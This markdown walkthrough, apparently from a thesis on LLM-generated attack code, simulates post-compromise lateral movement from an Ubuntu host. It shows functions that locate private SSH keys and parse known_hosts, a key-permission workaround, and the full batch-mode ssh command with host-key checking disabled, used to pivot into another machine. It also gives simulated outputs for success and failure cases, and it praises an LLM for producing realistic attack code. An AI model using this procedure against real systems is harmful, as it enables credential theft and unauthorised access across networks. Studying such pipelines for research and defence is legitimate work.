# Level 2 Query: Detailed Walkthrough & Simulation

## The Query (Translated)

**In Plain Language:**

You're on a compromised Ubuntu machine (192.168.1.50). Your goal is to:

1. **Reconnaissance Phase** (Local Discovery)
   - Find SSH private keys hidden in the user's home directory
   - See what other hosts this user has previously connected to (from known_hosts)
   
2. **Exploitation Phase** (Lateral Movement)
   - Use one of those discovered keys to SSH into another machine (192.168.1.100)
   - Execute a command to prove you have access
   - Do it silently (no prompts, no interactive shells)

**Why This Matters (Attack Narrative):**
- You've compromised user "alice" on 192.168.1.50
- Alice has SSH keys for her work on other systems
- You want to use Alice's keys to pivot to 192.168.1.100 (the main server)
- Once there, you execute a simple test command to confirm access

---

## Concrete Example Scenario

### Starting State (On 192.168.1.50)

**Current user:** alice (uid=1000)
**Current directory:** /home/alice

**Alice's ~/.ssh directory contains:**
```
~/.ssh/
├── id_rsa                    (private key - mode 0644, readable)
├── id_rsa.pub                (public key)
├── id_ed25519                (private key - mode 0600, readable)
├── id_ed25519.pub            (public key)
├── known_hosts               (history of SSH connections)
├── config                    (SSH config, not a key)
└── authorized_keys           (not a private key)
```

**Alice's known_hosts file contains:**
```
192.168.1.100 ssh-rsa AAAAB3NzaC1yc2E...
192.168.1.101 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...
github.com ssh-rsa AAAAB3NzaC1yc2E...
192.168.1.50 ssh-rsa AAAAB3NzaC1yc2E... (localhost entry)
```

---

## Step-by-Step Execution Walkthrough

### PHASE 1: SSH DISCOVERY (TASK_001)

#### Step 1.1: discover_ssh_private_keys() is called

```python
discover_ssh_private_keys(search_dir=None)  # Uses ~/.ssh by default
```

**What happens:**
1. Opens ~/.ssh directory
2. Iterates through files: id_rsa, id_rsa.pub, id_ed25519, id_ed25519.pub, known_hosts, config, authorized_keys

**For each file:**
- `id_rsa`:
  - ✓ Is a file
  - ✓ Mode = 0o644 (readable by owner)
  - ✓ Readable by os.access()
  - ✓ First 256 bytes contain "BEGIN RSA PRIVATE KEY"
  - ✅ **ADDED:** `SshKeyCandidate(path=~/.ssh/id_rsa, key_type="rsa", mode=0o644, readable=True)`

- `id_rsa.pub`:
  - ✓ Is a file
  - ✓ First 256 bytes do NOT contain "PRIVATE KEY"
  - ❌ **SKIPPED**

- `id_ed25519`:
  - ✓ Is a file
  - ✓ Mode = 0o600 (secure permissions)
  - ✓ Readable
  - ✓ First 256 bytes contain "BEGIN OPENSSH PRIVATE KEY"
  - ✅ **ADDED:** `SshKeyCandidate(path=~/.ssh/id_ed25519, key_type="openssh", mode=0o600, readable=True)`

- `known_hosts`, `config`, `authorized_keys`:
  - ❌ **SKIPPED** (no "PRIVATE KEY" marker)

**Function returns:**
```python
[
  SshKeyCandidate(path=Path('/home/alice/.ssh/id_rsa'), key_type='rsa', mode=0o644, readable=True),
  SshKeyCandidate(path=Path('/home/alice/.ssh/id_ed25519'), key_type='openssh', mode=0o600, readable=True),
]
```

#### Step 1.2: parse_known_hosts() is called

```python
parse_known_hosts(files=None)  # Uses ~/.ssh/known_hosts + /etc/ssh/ssh_known_hosts
```

**What happens:**

1. Reads ~/.ssh/known_hosts (file exists and is readable)
2. Parses each line:

**Line 1:** `192.168.1.100 ssh-rsa AAAAB3NzaC1yc2E...`
- Not a comment, not blank
- First field: "192.168.1.100"
- No comma, no port specified
- ✅ **ADDED:** `KnownHostEntry(host='192.168.1.100', port=None, raw_line=...)`

**Line 2:** `192.168.1.101 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...`
- ✅ **ADDED:** `KnownHostEntry(host='192.168.1.101', port=None, raw_line=...)`

**Line 3:** `github.com ssh-rsa AAAAB3NzaC1yc2E...`
- ✅ **ADDED:** `KnownHostEntry(host='github.com', port=None, raw_line=...)`

**Line 4:** `192.168.1.50 ssh-rsa AAAAB3NzaC1yc2E...`
- ✅ **ADDED:** `KnownHostEntry(host='192.168.1.50', port=None, raw_line=...)`

3. Also attempts to read /etc/ssh/ssh_known_hosts (may not exist for unprivileged user, skipped)

**Function returns:**
```python
[
  KnownHostEntry(host='192.168.1.100', port=None, ...),
  KnownHostEntry(host='192.168.1.101', port=None, ...),
  KnownHostEntry(host='github.com', port=None, ...),
  KnownHostEntry(host='192.168.1.50', port=None, ...),
]
```

**End of TASK_001:**
- ✅ SSH keys discovered: 2 candidates
- ✅ Known hosts parsed: 4 target systems identified
- ⚠️ Known hosts are NOT used further in TASK_002 (as discussed earlier)

---

### PHASE 2: LATERAL MOVEMENT (TASK_002)

#### Step 2.1: ssh_lateral_move() is called

```python
ssh_lateral_move()
```

**Gets remote user:**
```python
remote_user = getpass.getuser()  # Returns "alice"
```

#### Step 2.2: For Each SSH Key Candidate (Try Lateral Movement)

**Candidate 1: ~/.ssh/id_rsa**

##### Step 2.2a: Prepare the Key

```python
_prepare_key(SshKeyCandidate(path=~/.ssh/id_rsa, mode=0o644, ...))
```

**What happens:**
1. Path is a file ✓
2. Is readable ✓
3. Current mode: 0o644 (NOT secure, should be 0o600)
4. Check: Is alice the owner? **YES** (it's in her ~/.ssh)
5. Check: Can alice write to it? **YES** (she owns it)
6. **Attempt: os.chmod(~/.ssh/id_rsa, 0o600)**
   - ✅ **SUCCESS** (alice can change permissions on her own file)
7. Return: `(str(~/.ssh/id_rsa), None, None)`
   - Ready to use, no temp file needed

##### Step 2.2b: Run SSH Command

```python
_run_ssh(key_path=str(~/.ssh/id_rsa), remote_user='alice')
```

**SSH command constructed:**
```bash
ssh -i /home/alice/.ssh/id_rsa \
    -o IdentitiesOnly=yes \
    -o BatchMode=yes \
    -o PasswordAuthentication=no \
    -o PubkeyAuthentication=yes \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    alice@192.168.1.100 \
    echo 'access confirmed'
```

**What happens on the wire:**

1. SSH tries to connect to 192.168.1.100 port 22
2. Server responds, presents host key
3. Client skips host key verification (StrictHostKeyChecking=no)
4. Client attempts authentication with ~/.ssh/id_rsa
5. Server checks: Does alice's authorized_keys contain id_rsa public key?
   - **YES** (admin already added alice's key for trusted access)
6. Authentication succeeds
7. Server executes: `echo 'access confirmed'`
8. Server returns output: `access confirmed\n`
9. SSH exits with returncode=0

**Python receives:**
```
stdout: "access confirmed\n"
stderr: ""
returncode: 0
```

##### Step 2.2c: Check Success Criteria

```python
if returncode == 0 and SUCCESS_MARKER in stdout:  # Both must be True
```

- returncode == 0? ✓ **YES**
- "access confirmed" in stdout? ✓ **YES**

**LATERAL MOVEMENT SUCCESSFUL** 🎯

---

### RESULT: Execution Summary

```python
LateralMoveResult(
    success=True,
    host='192.168.1.100',
    remote_user='alice',
    key_path='/home/alice/.ssh/id_rsa',
    stdout='access confirmed\n',
    stderr='',
    returncode=0,
    attempted_keys=['/home/alice/.ssh/id_rsa'],
)
```

**In plain English:**
✅ Successfully accessed 192.168.1.100 as alice using id_rsa key
✅ Verified access by executing `echo 'access confirmed'` remotely
✅ No interactive prompts needed
✅ Completed cleanly

---

## Alternative Scenarios

### Scenario 2: id_rsa Has Wrong Permissions (0o644)

**Setup:** id_rsa is owned by alice but she can't chmod it (hypothetically)

**What happens in _prepare_key():**
1. Mode is 0o644 (not 0o600)
2. Try os.chmod(path, 0o600)
   - ❌ **Fails** (permission denied - hypothetically)
3. Fall back to: Create tempfile with 0o600, copy id_rsa content into it
4. Return: `(temp_path, temp_path, None)`

**Later in finally block:**
```python
if temp_path:
    os.unlink(temp_path)  # Clean up the temp file
```

**Result:** Still works, just via temporary copy ✅

---

### Scenario 3: Key Authentication Fails

**Setup:** id_rsa exists but alice's key is NOT in authorized_keys on 192.168.1.100

**SSH output:**
```
Permission denied (publickey).
```

**Python receives:**
```
stdout: ""
stderr: "Permission denied (publickey)."
returncode: 255
```

**Checks:**
- returncode == 0? ❌ NO (it's 255)
- "access confirmed" in stdout? ❌ NO

**Decision:** Try next key (id_ed25519)

**Candidate 2: ~/.ssh/id_ed25519**
- (Repeat steps 2.2a-2.2c with id_ed25519 key)
- If it's also not authorized: continue to error result

**Final result:**
```python
LateralMoveResult(
    success=False,
    host='192.168.1.100',
    remote_user='alice',
    key_path=None,
    stdout='',
    stderr='id_rsa: returncode=255, detail=Permission denied (publickey).\n'
           'id_ed25519: returncode=255, detail=Permission denied (publickey).',
    returncode=255,
    attempted_keys=['/home/alice/.ssh/id_rsa', '/home/alice/.ssh/id_ed25519'],
)
```

❌ Lateral movement failed

---

### Scenario 4: 192.168.1.100 Not Reachable

**SSH output:**
```
ssh: connect to host 192.168.1.100 port 22: No route to host
```

**Python receives:**
```
stdout: ""
stderr: "ssh: connect to host 192.168.1.100 port 22: No route to host"
returncode: 255
```

**Result:** Failed (network issue, not code issue)

---

## What This Demonstrates (For Your Thesis)

### 1. **Multi-Stage Attack Chain**
   - Stage 1: Reconnaissance (find keys, enumerate targets)
   - Stage 2: Exploitation (use keys for access)
   - Stage 3: Verification (confirm successful access)

### 2. **Realistic Error Handling**
   - ✅ Handles permission variations
   - ✅ Falls back to temp files
   - ✅ Tries multiple keys
   - ✅ Reports all attempts

### 3. **Non-Interactive Execution**
   - ✅ No prompts
   - ✅ No user input needed
   - ✅ Can run in background/scheduler
   - ✅ Clean error reporting

### 4. **Attack Realism**
   - Uses real SSH flags (BatchMode, StrictHostKeyChecking)
   - Avoids known_hosts checks (StrictHostKeyChecking=no)
   - Handles common permission issues
   - Supports multiple key types (RSA, ED25519, ECDSA, DSA)

### 5. **Generated Code Quality**
   - ✅ LLM correctly generated realistic lateral movement code
   - ✅ Proper error handling
   - ✅ Security-aware SSH configuration
   - ✅ Multi-key fallback strategy

---

## Key Takeaways

| Phase | What Happened | Generated By |
|-------|---------------|--------------|
| **Discovery** | Found 2 keys + 4 known hosts | TASK_001 (excellent) |
| **Preparation** | Fixed permissions (0o644 → 0o600) | TASK_002 (robust) |
| **Connection** | SSH with non-interactive flags | TASK_002 (correct) |
| **Verification** | Check returncode AND output | TASK_002 (sound logic) |
| **Result** | Lateral movement successful | Pipeline working ✅ |

---

## The "Dead Code" Problem Revisited

In this scenario:
- ✅ Known_hosts were parsed correctly (4 hosts found)
- ❌ But they were never used (always connected to hardcoded 192.168.1.100)
- ✅ If the query asked: "Try all hosts from known_hosts", the data would be ready
- ❌ But the query said: "Connect to specific target 192.168.1.100"

**So the planner's decision made sense:**
Include known_hosts discovery (completes query) but don't use them (respects execution constraint).
